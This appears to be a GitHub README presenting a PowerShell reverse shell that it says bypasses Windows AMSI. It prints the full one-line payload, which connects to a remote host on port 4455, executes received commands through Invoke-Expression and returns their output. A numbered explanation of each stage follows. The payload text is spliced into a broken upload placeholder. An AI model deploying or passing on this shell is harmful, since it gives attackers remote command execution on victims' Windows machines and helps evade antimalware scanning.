# PowerShell_Reverse_Shell_AMSI_Bypass
This script is a reverse shell written in PowerShell capable of bypassing the Windows AMSI.

[Uplo$h="10.10.10.10";$p=4455;$c=New-Object Net.Sockets.TCPClient($h,$p);$s=$c.GetStream();$r=New-Object IO.StreamReader($s);$w=New-Object IO.StreamWriter($s);$w.AutoFlush=$true;$b=New-Object System.Byte[] 1024;while($c.Connected){while($s.DataAvailable){$d=$s.Read($b,0,$b.Length);$e=([text.encoding]::UTF8).GetString($b,0,$d-1)}if($c.Connected -and $e.Length -gt 1){$o=try{Invoke-Expression $e 2>&1}catch{$_};$w.Write("$o`n");$e=$null}}$c.Close();$s.Close();$r.Close();$w.Close()
ading reverse.ps1…]()

1. Connection Setup:
 - It connects to a remote host (10.10.10.10) on port 4455 using a TCP client.
 - A network stream is established for data transmission.

2. Data Handling:
 - It continuously listens for incoming data from the remote host.
 - Incoming data (commands) is read as UTF-8 encoded text, interpreted, and executed on the local system using Invoke-Expression.

3. Response Transmission:
 - The output or errors resulting from the executed commands are sent back to the remote host over the same TCP connection.

4. Loop Behavior:
 - The script runs in a loop as long as the TCP connection is active, ensuring a continuous back-and-forth communication.

5. Cleanup:
 - Once the connection is closed, all resources (the TCP client, stream, and readers/writers) are properly disposed of.


![ReverseShell](https://github.com/user-attachments/assets/b05cdcf4-5fd6-4463-8802-2a53dcb3871b)
